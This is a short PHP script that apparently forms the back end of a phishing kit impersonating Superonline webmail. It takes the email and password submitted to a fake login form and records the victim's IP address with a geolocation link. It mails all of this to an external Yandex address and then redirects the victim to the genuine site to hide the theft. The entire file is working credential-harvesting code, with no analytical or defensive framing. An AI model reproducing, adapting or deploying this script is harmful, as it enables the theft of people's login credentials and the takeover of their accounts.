<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['login'];
$password = $_POST['password'];


$login = "Email : ".$email." ";
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;
$country = "Country : http://www.geoplugin.net/json.gp?ip=".$ip;

$head = "########### Login odagbu ############";
$foot = "####### Indramayu CyBer ###########";
$body = "SUPERONLINE V 1.0 |".$ip;
mail("spfmasters2@yandex.com", "$body","$head \n\n$login \n$pass \n$target \n$country \n\n$foot");
header("Location: https://eposta.superonline.com/index2.php");
?>